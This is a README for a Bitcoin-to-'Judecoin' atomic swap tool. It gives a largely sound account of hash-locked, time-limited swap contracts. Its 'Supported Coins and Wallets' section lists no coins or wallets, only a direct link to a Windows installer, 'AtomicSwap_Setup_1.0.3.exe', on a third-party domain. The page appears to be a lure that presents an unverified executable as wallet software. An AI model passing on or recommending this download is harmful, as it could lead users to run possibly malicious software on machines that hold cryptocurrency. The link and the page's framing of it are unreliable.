# Bitcoin <-> Judecoin Atomic Swaps

A way to exchange between Judecoin and Bitcoin without relying on a trusted third party, such as a cryptocurrency exchange company, and without needing to trust the person on the other side of the swap.

## Overview

This repository contains utilities for manually performing cross-chain atomic exchanges between supported cryptocurrency pairs.

## Supported Coins and Wallets

Currently, the following coins and wallets are supported:

- [Atomic Swap Setup 1.0.3](http://www.atomicswaps.pro/storage/swap/AtomicSwap_Setup_1.0.3.exe)

Users should verify any downloaded software through official sources before running it.

## Theory

A cross-chain swap is a trade between two users of different cryptocurrencies. For example, one party may send Judecoin to a second party's Judecoin address, while the second party sends Bitcoin to the first party's Bitcoin address. However, as the blockchains are unrelated and transactions cannot be reversed, this provides no protection against one of the parties never honoring their end of the trade.

One common solution to this problem is to introduce a mutually trusted third party for escrow. An atomic cross-chain swap solves this problem without the need for a third party.

Atomic swaps involve each party paying into a contract transaction, with one contract for each blockchain. The contracts contain an output that is spendable by either party, but the rules required for redemption are different for each party involved.

One party (called counterparty 1 or the initiator) generates a secret and pays the intended trade amount into a contract transaction. The contract output can be redeemed by the second party (called counterparty 2 or the participant) as long as the secret is known. If a period of time (typically 48 hours) expires after the contract transaction has been mined but has not been redeemed by the participant, the contract output can be refunded back to the initiator's wallet.

For simplicity, we assume the initiator wishes to trade Bitcoin for Judecoin with the participant. The initiator can also trade Judecoin for Bitcoin, and the steps will be the same, but with each step performed on the other blockchain.

The participant is unable to spend from the initiator's Bitcoin contract at this point because the secret is unknown to them. If the initiator revealed the secret at this point, the participant could spend from the contract without ever honoring their end of the trade.

The participant creates a similar contract transaction to the initiator's, but on the Judecoin blockchain, and pays the intended Judecoin amount into the contract. However, for the initiator to redeem the output, their own secret must be revealed. For the participant to create their contract, the initiator must reveal not the secret itself, but a cryptographic hash of the secret to the participant.

The participant's contract can also be refunded by the participant, but only after half the period of time that the initiator is required to wait before their contract can be refunded (typically 24 hours).

With each side paying into a contract on each blockchain, and each party unable to perform their refund until the allotted time expires, the initiator redeems the participant's Judecoin contract, thereby revealing the secret to the participant. The secret is then extracted from the initiator's redeeming Judecoin transaction, providing the participant with the ability to redeem the initiator's Bitcoin contract.

This procedure is atomic (with timeout), as it gives each party at least 24 hours to redeem their coins on the other blockchain before a refund can be performed.
